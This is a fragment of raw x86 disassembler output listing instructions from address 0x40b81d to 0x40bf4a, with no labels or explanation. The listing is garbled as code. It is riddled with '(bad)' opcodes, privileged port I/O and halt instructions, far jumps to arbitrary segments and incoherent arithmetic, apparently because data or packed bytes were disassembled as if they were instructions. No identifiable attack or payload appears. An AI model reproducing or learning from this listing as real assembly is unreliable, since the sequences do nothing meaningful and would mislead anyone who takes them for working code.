  40b81d:	pop    ebp
  40b81e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b81f:	sbb    ecx,DWORD PTR [ebx]
  40b821:	and    BYTE PTR [eax-0x6d],bh
  40b824:	out    dx,eax
  40b825:	mov    ds:0xe2ac9e5a,eax
  40b82a:	fidivr DWORD PTR [bx+di]
  40b82d:	loop   0x40b7f0
  40b82f:	dec    ecx
  40b830:	cmp    eax,0x36efbc9a
  40b835:	mov    edi,0x6ff83357
  40b83a:	sub    al,0x5f
  40b83c:	push   0xdaf6c250
  40b841:	call   0x7fa25b43
  40b846:	adc    dl,BYTE PTR [edi]
  40b848:	scas   eax,DWORD PTR es:[edi]
  40b849:	add    ecx,DWORD PTR [ebp-0x35]
  40b84c:	push   edx
  40b84d:	jg     0x40b8b9
  40b84f:	repnz ins DWORD PTR es:[edi],dx
  40b851:	fwait
  40b852:	lea    eax,[edx]
  40b854:	call   0xf066:0x86635e04
  40b85b:	jp     0x40b854
  40b85d:	aas    
  40b85e:	mov    bh,al
  40b860:	mov    DWORD PTR [edi-0x24087bb8],0xab89910b
  40b86a:	xor    al,0x51
  40b86c:	xchg   edx,eax
  40b86d:	sub    DWORD PTR [edx-0x66],ecx
  40b870:	inc    edx
  40b871:	aam    0x6f
  40b873:	cmp    dl,dh
  40b875:	or     dh,BYTE PTR [edx+0x61]
  40b878:	push   ecx
  40b879:	addr16 dec edx
  40b87b:	xchg   esp,eax
  40b87c:	and    ebx,ecx
  40b87e:	retf   0x65f3
  40b881:	iret   
  40b882:	fbstp  TBYTE PTR ss:[esi+0x21fc9189]
  40b889:	cwde   
  40b88a:	xchg   edi,eax
  40b88b:	mov    edi,ds
  40b88d:	and    BYTE PTR [esi+0x46ad3524],dl
  40b893:	pop    ebx
  40b894:	rcr    BYTE PTR [edi+eiz*4],cl
  40b897:	(bad)  
  40b899:	out    dx,al
  40b89a:	and    dh,BYTE PTR [ecx-0x7fb518cf]
  40b8a0:	dec    esp
  40b8a1:	sub    BYTE PTR [ebp+edi*1-0x3e],bh
  40b8a5:	clc    
  40b8a6:	cs clc 
  40b8a8:	jns    0x40b910
  40b8aa:	dec    ecx
  40b8ab:	les    edx,FWORD PTR [eax]
  40b8ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8ae:	in     eax,dx
  40b8af:	lahf   
  40b8b0:	dec    ecx
  40b8b1:	xchg   edx,eax
  40b8b2:	stos   DWORD PTR es:[edi],eax
  40b8b3:	mov    ?,WORD PTR [edx-0x37]
  40b8b6:	fistp  QWORD PTR [eax+eiz*2+0x34605864]
  40b8bd:	(bad)  
  40b8bf:	xor    edx,edx
  40b8c1:	sub    eax,0xa21cf06d
  40b8c6:	(bad)  
  40b8c7:	add    eax,0x63ed28b5
  40b8cc:	adc    al,0xe0
  40b8ce:	dec    ecx
  40b8cf:	imul   esi,DWORD PTR [edx+0x39ef8980],0x59471e04
  40b8d9:	fild   DWORD PTR [ecx-0x66]
  40b8dc:	fmul   QWORD PTR [ebx+0x71]
  40b8df:	jbe    0x40b93c
  40b8e1:	mov    esp,0x9f67efa8
  40b8e6:	or     DWORD PTR [edi+0x68],edx
  40b8e9:	stc    
  40b8ea:	ss dec eax
  40b8ec:	add    ch,BYTE PTR [edx+ecx*4]
  40b8ef:	icebp  
  40b8f0:	stc    
  40b8f1:	aam    0x1c
  40b8f3:	add    eax,0x241f3086
  40b8f8:	fstp   TBYTE PTR [edi-0x162badb2]
  40b8fe:	sub    al,BYTE PTR [ebx]
  40b900:	aad    0xff
  40b902:	lock scas al,BYTE PTR es:[edi]
  40b904:	retf   
  40b905:	cmc    
  40b906:	in     eax,0x4
  40b908:	fbstp  TBYTE PTR [edi-0x7d6bd908]
  40b90e:	push   0x56e58fbe
  40b913:	fwait
  40b914:	mov    ebp,ebp
  40b916:	pop    esp
  40b917:	xchg   ecx,eax
  40b918:	(bad)  
  40b919:	or     eax,0xb05255bd
  40b91e:	aam    0x77
  40b920:	aad    0x6b
  40b922:	je     0x40b956
  40b924:	in     eax,0x4a
  40b926:	lock loopne 0x40b8d3
  40b929:	lods   al,BYTE PTR ds:[esi]
  40b92a:	push   es
  40b92b:	aas    
  40b92c:	mov    eax,DWORD PTR [ecx-0x5fa8cba9]
  40b932:	aaa    
  40b933:	add    ebx,DWORD PTR [esi+0x48]
  40b936:	push   0x3e
  40b938:	lods   eax,DWORD PTR ds:[esi]
  40b939:	or     esp,edx
  40b93b:	sub    esp,DWORD PTR [ecx+0x71]
  40b93e:	jo     0x40b905
  40b940:	jne    0x40b942
  40b942:	cmp    ebx,esi
  40b944:	inc    esp
  40b945:	xchg   ecx,eax
  40b946:	js     0x40b99d
  40b948:	loope  0x40b8fe
  40b94a:	fist   WORD PTR [bx-0x522f]
  40b94f:	mov    al,ds:0xae4c6916
  40b954:	push   cs
  40b955:	aad    0x44
  40b957:	xlat   BYTE PTR ds:[ebx]
  40b958:	push   edi
  40b959:	out    0x5d,eax
  40b95b:	iret   
  40b95c:	dec    eax
  40b95d:	add    al,0xd8
  40b95f:	mov    ebp,0xcef823ff
  40b964:	hlt    
  40b965:	mov    bh,0x97
  40b967:	shl    DWORD PTR [ebx+0x20],0x51
  40b96b:	push   cs
  40b96c:	mov    WORD PTR [esi+esi*4],ss
  40b96f:	fwait
  40b970:	test   al,0x85
  40b972:	retf   
  40b973:	xchg   esi,eax
  40b974:	jns    0x40b9c0
  40b976:	fimul  WORD PTR [esi]
  40b978:	adc    al,0xd9
  40b97a:	inc    eax
  40b97b:	inc    esp
  40b97c:	stos   BYTE PTR es:[edi],al
  40b97d:	test   al,0x75
  40b97f:	dec    ecx
  40b980:	push   edi
  40b981:	add    bl,dl
  40b983:	jmp    0x7e21:0xd009d668
  40b98a:	arpl   bx,si
  40b98c:	mov    esp,0x5ce10754
  40b991:	add    al,0x8
  40b993:	ja     0x40b979
  40b995:	cmp    ch,BYTE PTR [edi-0x1d3c4897]
  40b99b:	push   ecx
  40b99c:	or     eax,0x832343d1
  40b9a1:	mov    eax,ds:0x164fab20
  40b9a6:	cmp    bh,BYTE PTR [eax+0x644826ec]
  40b9ac:	mov    edx,0x26ef92bb
  40b9b1:	jae    0x40b9ff
  40b9b3:	push   ebp
  40b9b4:	add    ebp,ebx
  40b9b6:	pop    ebx
  40b9b7:	xchg   dl,cl
  40b9b9:	cli    
  40b9ba:	mov    ebx,0xb80ce258
  40b9bf:	mov    dh,0xf2
  40b9c1:	rcl    BYTE PTR [eax],cl
  40b9c3:	push   0x36
  40b9c5:	fs mov ebx,0x58389233
  40b9cb:	and    al,0x38
  40b9cd:	xchg   ebx,eax
  40b9ce:	into   
  40b9cf:	pop    es
  40b9d0:	enter  0xb995,0x47
  40b9d4:	mov    al,BYTE PTR [esi+ebp*8-0x46]
  40b9d8:	in     eax,dx
  40b9d9:	jo     0x40b963
  40b9db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9dc:	cwde   
  40b9dd:	rcr    BYTE PTR [eax],0xf4
  40b9e0:	pop    es
  40b9e1:	and    BYTE PTR [edx+ebx*1-0x2d3a5a2],bh
  40b9e8:	arpl   WORD PTR [esi],bp
  40b9ea:	retf   0x3820
  40b9ed:	in     al,dx
  40b9ee:	push   ecx
  40b9ef:	iret   
  40b9f0:	addr16 sbb edi,ebx
  40b9f3:	lods   eax,DWORD PTR ds:[esi]
  40b9f4:	adc    al,0xe4
  40b9f6:	and    BYTE PTR [ebx],bl
  40b9f8:	pushf  
  40b9f9:	bound  edi,QWORD PTR [edx+0x68]
  40b9fc:	pop    ds
  40b9fd:	jo     0x40ba66
  40b9ff:	ss icebp 
  40ba01:	push   ss
  40ba02:	int3   
  40ba03:	cmp    DWORD PTR [esi-0x2e0708ea],ecx
  40ba09:	out    dx,eax
  40ba0a:	cli    
  40ba0b:	retf   0x6f6a
  40ba0e:	sbb    BYTE PTR [edx+0x4],bh
  40ba11:	les    esi,FWORD PTR [esi+0x14]
  40ba14:	xor    al,0xce
  40ba16:	aad    0x86
  40ba18:	jmp    0x4846:0x9b770b4d
  40ba1f:	in     eax,0x99
  40ba21:	ins    BYTE PTR es:[edi],dx
  40ba22:	or     ah,ch
  40ba24:	imul   esp,ebx,0xf7644284
  40ba2a:	push   cs
  40ba2b:	(bad)  
  40ba2c:	sbb    ebx,DWORD PTR [ebx+0x68ef705f]
  40ba32:	mov    eax,0xc0b465f3
  40ba37:	scas   eax,DWORD PTR es:[edi]
  40ba38:	stos   BYTE PTR es:[edi],al
  40ba39:	shl    DWORD PTR [ebp-0x3c35617b],cl
  40ba3f:	or     ch,BYTE PTR [edi-0x3a]
  40ba42:	ror    BYTE PTR [edi+ecx*2-0x6d],cl
  40ba46:	mov    ch,BYTE PTR [ebx-0x78]
  40ba49:	jp     0x40bac4
  40ba4b:	jbe    0x40ba2d
  40ba4d:	es stos DWORD PTR es:[edi],eax
  40ba4f:	sbb    esp,ecx
  40ba51:	out    0x3,al
  40ba53:	out    dx,eax
  40ba54:	in     al,dx
  40ba55:	jmp    0xbb18:0x696d1d63
  40ba5c:	add    eax,0x54c26733
  40ba61:	lea    edx,[edx+eax*8]
  40ba64:	push   0xffffff83
  40ba66:	fldcw  WORD PTR [eax]
  40ba68:	ret    0xb00b
  40ba6b:	sbb    al,0x5a
  40ba6d:	(bad)  
  40ba70:	add    al,0xf3
  40ba72:	es push eax
  40ba74:	xchg   edx,eax
  40ba75:	sub    al,0x46
  40ba77:	loope  0x40ba8d
  40ba79:	jns    0x40ba80
  40ba7b:	stos   BYTE PTR es:[edi],al
  40ba7c:	dec    eax
  40ba7d:	mov    edx,0x6c026ddc
  40ba82:	leave  
  40ba83:	push   0x1e
  40ba85:	or     ecx,DWORD PTR [edi+esi*4-0x5b73bc6d]
  40ba8c:	adc    al,0x0
  40ba8e:	mov    dl,BYTE PTR [edx]
  40ba90:	out    0x91,al
  40ba92:	loope  0x40ba3a
  40ba94:	add    DWORD PTR [esi-0x5883fded],ecx
  40ba9a:	add    bh,cl
  40ba9c:	pop    esi
  40ba9d:	(bad)  
  40ba9e:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40baa0:	adc    BYTE PTR [ecx],dh
  40baa2:	dec    edx
  40baa3:	jge    0x40ba39
  40baa5:	xchg   ebx,eax
  40baa6:	lock out dx,eax
  40baa8:	jge    0x40bad6
  40baaa:	outs   dx,BYTE PTR ds:[esi]
  40baab:	inc    eax
  40baac:	jg     0x40bb00
  40baae:	cdq    
  40baaf:	sbb    esp,DWORD PTR [esi-0xd]
  40bab2:	mov    edx,0xcc4c9a3
  40bab7:	stos   DWORD PTR es:[edi],eax
  40bab8:	inc    esp
  40bab9:	xchg   esi,eax
  40baba:	stc    
  40babb:	test   eax,0x250aa2ff
  40bac0:	or     DWORD PTR [ecx+ecx*4],ecx
  40bac3:	hlt    
  40bac4:	pop    es
  40bac5:	lds    ebx,FWORD PTR [ebx+0x479a5312]
  40bacb:	dec    esi
  40bacc:	arpl   di,si
  40bace:	dec    eax
  40bacf:	push   0xffffffe4
  40bad1:	loope  0x40bb50
  40bad3:	mov    edx,0x658fa262
  40bad8:	push   edi
  40bad9:	popf   
  40bada:	xchg   ebx,ebp
  40badc:	stos   DWORD PTR es:[edi],eax
  40badd:	or     eax,0x242f1d18
  40bae2:	adc    edx,edi
  40bae4:	fbld   TBYTE PTR [edx-0x24103cfe]
  40baea:	push   ebx
  40baeb:	xchg   esi,edx
  40baed:	inc    ebx
  40baee:	mov    DWORD PTR ds:0x9e7ffe87,edi
  40baf4:	out    0xcd,al
  40baf6:	mov    esi,0xac5590cc
  40bafb:	mov    ds:0x9a66d77,eax
  40bb00:	mov    ecx,0x4b0f1bb0
  40bb05:	jns    0x40ba8f
  40bb07:	mov    BYTE PTR [edx+0x50],al
  40bb0a:	in     al,0xc0
  40bb0c:	dec    ebx
  40bb0d:	shl    BYTE PTR [edx+edx*2],1
  40bb10:	das    
  40bb11:	ja     0x40bb56
  40bb13:	scas   eax,DWORD PTR es:[edi]
  40bb14:	push   ebp
  40bb15:	rcl    DWORD PTR [ecx+0x56aa48c7],0x27
  40bb1c:	rol    DWORD PTR [ecx+0x64d07cc8],cl
  40bb22:	xchg   edx,eax
  40bb23:	jecxz  0x40bb05
  40bb25:	sbb    esi,DWORD PTR [ebx]
  40bb27:	mov    di,0x1c9d
  40bb2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb2c:	mov    DWORD PTR [eax+0x23d52cd3],ebp
  40bb32:	nop
  40bb33:	out    dx,al
  40bb34:	sub    al,0x8
  40bb36:	mov    ch,BYTE PTR [esi-0x3c]
  40bb39:	or     ecx,esp
  40bb3b:	mov    al,0xcc
  40bb3d:	inc    ebx
  40bb3e:	mov    ah,BYTE PTR [eax+0x7f]
  40bb41:	pop    ecx
  40bb42:	imul   ebx,edx,0x8bd091ab
  40bb48:	lds    ecx,FWORD PTR [edx]
  40bb4a:	mov    ?,WORD PTR [esi]
  40bb4c:	outs   dx,BYTE PTR ds:[esi]
  40bb4d:	mov    esp,0xbe1a88f4
  40bb52:	mov    eax,0x244d878d
  40bb57:	inc    ebp
  40bb58:	aas    
  40bb59:	xor    bl,dh
  40bb5b:	jmp    ebp
  40bb5d:	jns    0x40bb39
  40bb5f:	push   cs
  40bb60:	push   ss
  40bb61:	sub    BYTE PTR [ecx+0x6e03f056],dl
  40bb67:	sbb    BYTE PTR [eax+0x1294da1e],al
  40bb6d:	(bad)  
  40bb6e:	ret    0x1bb0
  40bb71:	aaa    
  40bb72:	out    dx,eax
  40bb73:	mov    dl,0x5d
  40bb75:	jecxz  0x40bb97
  40bb77:	fidivr WORD PTR [edx+0x18]
  40bb7a:	imul   edx,ecx,0x569fabf5
  40bb80:	add    al,0x93
  40bb82:	retf   0x4931
  40bb85:	sbb    al,0xd0
  40bb87:	adc    eax,0x301d79b0
  40bb8c:	inc    ax
  40bb8e:	lds    eax,FWORD PTR [edi+0x791db48e]
  40bb94:	iret   
  40bb95:	and    bl,dh
  40bb97:	and    ebp,edi
  40bb99:	in     al,0x1c
  40bb9b:	dec    ecx
  40bb9c:	and    BYTE PTR [ebp-0xa],0x77
  40bba0:	test   BYTE PTR [eax+esi*1-0x4ffbc3a6],ah
  40bba7:	pop    eax
  40bba8:	and    al,0xe9
  40bbaa:	inc    edx
  40bbab:	mov    dh,0x30
  40bbad:	sub    BYTE PTR [ecx-0x179e937],0x83
  40bbb4:	outs   dx,DWORD PTR ds:[esi]
  40bbb5:	dec    ebp
  40bbb6:	loope  0x40bbcd
  40bbb8:	fs inc ebp
  40bbba:	push   edx
  40bbbb:	inc    edx
  40bbbc:	hlt    
  40bbbd:	mov    ch,0xcb
  40bbbf:	jg     0x40bb5b
  40bbc1:	fiadd  DWORD PTR [edi]
  40bbc3:	mov    eax,0x398774c3
  40bbc8:	sbb    DWORD PTR [ebx-0x6d],ebx
  40bbcb:	cmp    eax,DWORD PTR [ebx+0xf]
  40bbce:	shl    bh,1
  40bbd0:	in     al,dx
  40bbd1:	xchg   ecx,eax
  40bbd2:	out    dx,al
  40bbd3:	sti    
  40bbd4:	add    eax,0x1f14bab6
  40bbd9:	push   ebx
  40bbda:	inc    ecx
  40bbdb:	add    eax,0xd6724def
  40bbe0:	push   cs
  40bbe1:	mov    BYTE PTR [eax],dl
  40bbe3:	push   ds
  40bbe4:	leave  
  40bbe5:	scas   al,BYTE PTR es:[edi]
  40bbe6:	lods   al,BYTE PTR ds:[esi]
  40bbe7:	jns    0x40bb9b
  40bbe9:	fs enter 0xbfd5,0x59
  40bbee:	sbb    eax,0xddddf8df
  40bbf3:	push   edi
  40bbf4:	jne    0x40bbcf
  40bbf6:	(bad)
  40bbf9:	add    BYTE PTR [edx],ah
  40bbfb:	pop    ebx
  40bbfc:	xchg   ebp,eax
  40bbfd:	dec    esp
  40bbfe:	out    dx,al
  40bbff:	xchg   ebp,eax
  40bc00:	aaa    
  40bc01:	cli    
  40bc02:	stos   DWORD PTR es:[edi],eax
  40bc03:	and    al,0xbe
  40bc05:	mov    edx,0x619b5224
  40bc0a:	mov    dl,0xa7
  40bc0c:	jecxz  0x40bc16
  40bc0e:	sbb    dl,bl
  40bc10:	lahf   
  40bc11:	je     0x40bc13
  40bc13:	push   edx
  40bc14:	add    esp,ebx
  40bc16:	(bad)  
  40bc17:	add    dh,dl
  40bc19:	je     0x40bc31
  40bc1b:	push   edx
  40bc1c:	fsub   QWORD PTR [edi-0x44db21d8]
  40bc22:	mov    cl,0xe0
  40bc24:	cmp    al,0xf7
  40bc26:	sahf   
  40bc27:	push   cs
  40bc28:	lea    ebp,[ebp+0x76542a9a]
  40bc2e:	loopne 0x40bc49
  40bc30:	int3   
  40bc31:	push   ebx
  40bc32:	xchg   edx,eax
  40bc33:	inc    ecx
  40bc34:	mov    ds:0x75bebd75,eax
  40bc39:	sub    BYTE PTR [ebx],bh
  40bc3b:	cmp    al,0x7a
  40bc3d:	xchg   edi,eax
  40bc3e:	div    BYTE PTR [ebp-0x30]
  40bc41:	push   eax
  40bc42:	add    al,0xd4
  40bc44:	xchg   esp,eax
  40bc45:	xchg   DWORD PTR [edi-0x271c3bb0],esi
  40bc4b:	add    eax,0xaeceaa81
  40bc50:	cdq    
  40bc51:	xchg   ecx,eax
  40bc52:	add    al,0xf1
  40bc54:	je     0x40bc77
  40bc56:	mov    dl,ah
  40bc58:	ret    
  40bc59:	add    al,0xfd
  40bc5b:	jmp    0x4484ed75
  40bc60:	repnz aaa 
  40bc62:	aaa    
  40bc63:	mov    al,BYTE PTR [eax-0x25b19280]
  40bc69:	pop    esp
  40bc6a:	repz fiadd DWORD PTR [edi+0x3a]
  40bc6e:	stos   DWORD PTR es:[edi],eax
  40bc6f:	sub    eax,0x5712750a
  40bc74:	cmp    edi,DWORD PTR [edx-0x7c0eabb7]
  40bc7a:	lea    edx,[ebp+esi*8+0x4]
  40bc7e:	mov    edi,0x35464ba3
  40bc83:	jne    0x40bcca
  40bc85:	bound  ecx,QWORD PTR ds:0x6fa3472b
  40bc8b:	not    BYTE PTR [esi-0x1ae089c4]
  40bc91:	aas    
  40bc92:	repnz jecxz 0x40bc2c
  40bc95:	retf   0xbcf2
  40bc98:	adc    al,ch
  40bc9a:	loop   0x40bc4d
  40bc9c:	pusha  
  40bc9d:	mov    dl,0x9f
  40bc9f:	dec    eax
  40bca0:	jns    0x40bcc2
  40bca2:	cmp    ah,0x58
  40bca5:	push   esi
  40bca6:	jl     0x40bc66
  40bca8:	xlat   BYTE PTR ds:[ebx]
  40bca9:	in     al,0xa7
  40bcab:	cwde   
  40bcac:	ins    DWORD PTR es:[edi],dx
  40bcad:	popf   
  40bcae:	xchg   esp,eax
  40bcaf:	cmp    eax,DWORD PTR [esi+0x58]
  40bcb2:	and    BYTE PTR [eax],bl
  40bcb4:	mov    bh,0x20
  40bcb6:	pop    eax
  40bcb7:	cli    
  40bcb8:	cmp    cl,BYTE PTR [ebx+0x7f]
  40bcbb:	xchg   ebp,eax
  40bcbc:	clc    
  40bcbd:	scas   eax,DWORD PTR es:[edi]
  40bcbe:	leave  
  40bcbf:	mov    BYTE PTR [esi],al
  40bcc1:	ja     0x40bcee
  40bcc3:	pushf  
  40bcc4:	int    0xf0
  40bcc6:	fcom   DWORD PTR [ebx+0x7da9217e]
  40bccc:	adc    al,0xf0
  40bcce:	adc    BYTE PTR [edx],al
  40bcd0:	jle    0x40bc6f
  40bcd2:	mov    bh,0x5f
  40bcd4:	cmp    cl,cl
  40bcd6:	les    eax,FWORD PTR [ebx]
  40bcd8:	add    dl,BYTE PTR [edi]
  40bcda:	call   0x32282565
  40bcdf:	push   ss
  40bce0:	jmp    0xc8cb:0x9f44913f
  40bce7:	pmaxsw mm5,QWORD PTR [edx]
  40bcea:	outs   dx,BYTE PTR ds:[esi]
  40bceb:	inc    esi
  40bcec:	leave  
  40bced:	inc    ecx
  40bcee:	rol    BYTE PTR [esi+0x1c],cl
  40bcf1:	shr    BYTE PTR [eax+ebp*8],cl
  40bcf4:	(bad)
  40bcf8:	sbb    ax,0x273d
  40bcfc:	loop   0x40bd77
  40bcfe:	xor    DWORD PTR [edx-0x1b],esp
  40bd01:	xor    al,0x22
  40bd03:	or     cl,BYTE PTR [edx]
  40bd05:	or     ah,ch
  40bd07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd08:	cmp    al,0x54
  40bd0a:	and    edx,esi
  40bd0c:	imul   esi,DWORD PTR [esi],0x962999a7
  40bd12:	(bad)  
  40bd13:	sbb    BYTE PTR [edx],bl
  40bd15:	sub    al,0x70
  40bd17:	fdiv   st,st(2)
  40bd19:	jl     0x40bd69
  40bd1b:	inc    edx
  40bd1c:	fld    TBYTE PTR [eax+0x56]
  40bd1f:	jl     0x40bd9b
  40bd21:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd23:	aad    0x94
  40bd25:	push   ss
  40bd26:	adc    DWORD PTR [eax],esi
  40bd28:	adc    al,0xfa
  40bd2a:	gs push esp
  40bd2c:	inc    ebx
  40bd2d:	stc    
  40bd2e:	outs   dx,DWORD PTR ds:[esi]
  40bd2f:	and    BYTE PTR [edi],ch
  40bd31:	arpl   WORD PTR [edx],sp
  40bd33:	or     bh,BYTE PTR [eax]
  40bd35:	or     BYTE PTR es:[eax],ch
  40bd38:	sub    BYTE PTR [esi-0x57a5077d],bl
  40bd3e:	xor    bh,BYTE PTR [esi-0x4edd9a99]
  40bd44:	inc    edx
  40bd45:	in     eax,dx
  40bd46:	mov    ebp,0xe68ac8e5
  40bd4b:	jmp    0xbefc:0xab1584b9
  40bd52:	jecxz  0x40bd57
  40bd54:	bnd ret 
  40bd56:	inc    esi
  40bd57:	jge    0x40bdc0
  40bd59:	xchg   ebp,eax
  40bd5a:	jg     0x40bdc0
  40bd5c:	jns    0x40bdc3
  40bd5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd5f:	icebp  
  40bd60:	jnp    0x40bdbd
  40bd62:	bound  ebx,QWORD PTR [ebp-0x237a35c0]
  40bd68:	dec    esp
  40bd69:	jl     0x40bd2c
  40bd6b:	iret   
  40bd6c:	mov    WORD PTR [edx+0x10],ds
  40bd6f:	js     0x40bd03
  40bd71:	loope  0x40bda0
  40bd73:	mov    ebp,0x1d163eac
  40bd78:	push   ss
  40bd79:	cmp    al,0x47
  40bd7b:	mov    esi,0xec899a61
  40bd80:	popa   
  40bd81:	fnstsw WORD PTR [ecx]
  40bd83:	push   ss
  40bd84:	inc    eax
  40bd85:	sub    DWORD PTR [ebp+0x394dbc06],0x56
  40bd8c:	push   ebp
  40bd8d:	jbe    0x40bd76
  40bd8f:	xor    ecx,ebp
  40bd91:	ds dec eax
  40bd93:	(bad)  
  40bd94:	not    BYTE PTR [eax]
  40bd96:	stos   DWORD PTR es:[edi],eax
  40bd97:	in     eax,dx
  40bd98:	xchg   ebp,eax
  40bd99:	leave  
  40bd9a:	mov    ch,0xe8
  40bd9c:	sbb    ch,bh
  40bd9e:	test   eax,0x3fb1bdc2
  40bda3:	(bad)  
  40bda4:	fidivr DWORD PTR [esp+eax*2-0x4dd15a8]
  40bdab:	outs   dx,DWORD PTR ds:[esi]
  40bdac:	add    al,0xcb
  40bdae:	scas   al,BYTE PTR es:[edi]
  40bdaf:	pusha  
  40bdb0:	ret    
  40bdb1:	lea    esp,[edi+0x1e21828c]
  40bdb7:	fwait
  40bdb8:	scas   eax,DWORD PTR es:[edi]
  40bdb9:	pop    ebx
  40bdba:	mov    bh,0xb0
  40bdbc:	lahf   
  40bdbd:	cmp    ecx,esp
  40bdbf:	add    al,0xf
  40bdc1:	pop    edx
  40bdc2:	cmc    
  40bdc3:	mov    esp,0x116922d9
  40bdc8:	in     eax,dx
  40bdc9:	mov    bl,BYTE PTR [ebp-0x25]
  40bdcc:	es js  0x40be2c
  40bdcf:	adc    BYTE PTR [edi+0x68f53251],0x3b
  40bdd6:	mov    dh,0x7a
  40bdd8:	jnp    0x40bdca
  40bdda:	aad    0xac
  40bddc:	enter  0xb58,0x85
  40bde0:	test   BYTE PTR [ecx-0x69ed2bab],bl
  40bde6:	xchg   esp,eax
  40bde7:	cmp    eax,0xc80e5f24
  40bdec:	int3   
  40bded:	inc    esp
  40bdee:	out    0xd3,al
  40bdf0:	push   edx
  40bdf1:	jmp    0x361a1e72
  40bdf6:	stos   BYTE PTR es:[edi],al
  40bdf7:	fadd   QWORD PTR [ebp+0x17adc460]
  40bdfd:	call   0x10b7:0x40f11051
  40be04:	and    eax,0xb78bb47d
  40be09:	sti    
  40be0a:	out    0x4e,eax
  40be0c:	sbb    al,0x4f
  40be0e:	dec    esi
  40be0f:	in     eax,0x2d
  40be11:	add    DWORD PTR [eax-0x4f],ebp
  40be14:	(bad)  
  40be15:	aas    
  40be16:	test   DWORD PTR [esi],esp
  40be18:	orps   xmm0,XMMWORD PTR [eax]
  40be1b:	jnp    0x40bdb3
  40be1d:	(bad)  
  40be1e:	(bad)  
  40be1f:	aaa    
  40be20:	test   al,0x41
  40be22:	sbb    ebp,DWORD PTR [esi-0x4]
  40be25:	jbe    0x40be1a
  40be27:	adc    BYTE PTR [ebx],al
  40be29:	mov    ds:0x1270ecb8,al
  40be2e:	mov    ds:0xcb383d11,eax
  40be33:	das    
  40be34:	mov    dh,0x25
  40be36:	(bad)  
  40be37:	mul    DWORD PTR [edx+0x79ae2467]
  40be3d:	pop    edi
  40be3e:	jg     0x40be56
  40be40:	in     eax,0x25
  40be42:	sub    eax,DWORD PTR [edi]
  40be44:	scas   eax,DWORD PTR es:[edi]
  40be45:	repnz fwait
  40be47:	stos   BYTE PTR es:[edi],al
  40be48:	mov    cl,0x1c
  40be4a:	test   eax,0x40549944
  40be4f:	(bad)  
  40be50:	fsub   DWORD PTR [edi-0x359811ba]
  40be56:	adc    bl,BYTE PTR [ecx]
  40be58:	add    DWORD PTR [esi-0x1e],ebx
  40be5b:	fxam   
  40be5d:	xchg   DWORD PTR [ecx+0x34],edx
  40be60:	mov    ah,BYTE PTR ds:0x6935a21d
  40be66:	pop    edi
  40be67:	lods   eax,DWORD PTR ds:[si]
  40be69:	sub    al,0x0
  40be6b:	push   ecx
  40be6c:	or     DWORD PTR [edx-0x6c575893],ebx
  40be72:	stos   BYTE PTR es:[edi],al
  40be73:	ins    DWORD PTR es:[edi],dx
  40be74:	jnp    0x40be33
  40be76:	lahf   
  40be77:	out    dx,eax
  40be78:	mov    ah,ch
  40be7a:	lahf   
  40be7b:	sbb    bl,dh
  40be7d:	sbb    edx,DWORD PTR [esi+0x6b2dc683]
  40be83:	in     eax,0xb4
  40be85:	dec    BYTE PTR [edi]
  40be87:	pop    ecx
  40be88:	gs jns 0x40be49
  40be8b:	jmp    0xc7fb:0xafa3dd88
  40be92:	push   ds
  40be93:	fistp  WORD PTR [edi-0x354b6082]
  40be99:	push   edx
  40be9a:	in     al,0x79
  40be9c:	(bad)  
  40be9d:	cmp    ch,bl
  40be9f:	push   0x50
  40bea1:	pop    ebx
  40bea2:	iret   
  40bea3:	mov    edi,0x971daef8
  40bea8:	ins    BYTE PTR es:[edi],dx
  40bea9:	and    al,0xbb
  40beab:	(bad)  
  40bead:	jp     0x40bef0
  40beaf:	(bad)  
  40beb0:	or     DWORD PTR [edx-0x50],esp
  40beb3:	sub    eax,0x103c5ee7
  40beb8:	and    al,0xb3
  40beba:	jbe    0x40be3f
  40bebc:	xor    ah,ah
  40bebe:	and    al,0x15
  40bec0:	out    0xa7,al
  40bec2:	sub    dh,dl
  40bec4:	sub    eax,DWORD PTR ds:0xe5e71b0b
  40beca:	xlat   BYTE PTR ds:[ebx]
  40becb:	and    eax,0xab69f08
  40bed0:	sub    ah,0x9c
  40bed3:	sub    DWORD PTR [ebp-0x165708f],esp
  40bed9:	xchg   BYTE PTR [ecx],cl
  40bedb:	mov    cl,0x15
  40bedd:	lods   al,BYTE PTR ds:[esi]
  40bede:	and    eax,0x42f95239
  40bee3:	adc    BYTE PTR ds:0x166c5ece,bl
  40bee9:	xchg   ebx,eax
  40beea:	data16 int3 
  40beec:	gs pop edi
  40beee:	sbb    BYTE PTR [edi+edx*4+0x2c],al
  40bef2:	push   cs
  40bef3:	test   DWORD PTR [ebx],eax
  40bef5:	add    eax,DWORD PTR [edi+0xc94e49a]
  40befb:	das    
  40befc:	jmp    0x9bc930a2
  40bf01:	mov    edx,0x58cdb84
  40bf06:	cmc    
  40bf07:	mov    DWORD PTR [esi],edx
  40bf09:	mov    dl,BYTE PTR [esi]
  40bf0b:	lods   al,BYTE PTR ds:[esi]
  40bf0c:	aaa    
  40bf0d:	adc    al,0xf8
  40bf0f:	out    0xe,eax
  40bf11:	daa    
  40bf12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf13:	aad    0x70
  40bf15:	adc    edi,DWORD PTR [ebx-0x5b]
  40bf18:	outs   dx,DWORD PTR ss:[esi]
  40bf1a:	xor    ebp,DWORD PTR [ebx-0x5e]
  40bf1d:	or     BYTE PTR [esi+0x76efc29a],0x6b
  40bf24:	ins    BYTE PTR es:[edi],dx
  40bf25:	inc    eax
  40bf26:	ror    BYTE PTR [ebx+0x696f10b9],cl
  40bf2c:	mov    dl,0x11
  40bf2e:	jecxz  0x40bf05
  40bf30:	xor    BYTE PTR [ecx+0x6fa6c5b3],bh
  40bf36:	fstp   st(2)
  40bf38:	push   0xc1d72ce4
  40bf3d:	lods   al,BYTE PTR ds:[esi]
  40bf3e:	add    BYTE PTR ds:0xe97e3ce7,dh
  40bf44:	lock pop es
  40bf46:	dec    edi
  40bf47:	xchg   ebp,eax
  40bf48:	sbb    dl,dh
  40bf4a:	sbb    al,0x8e
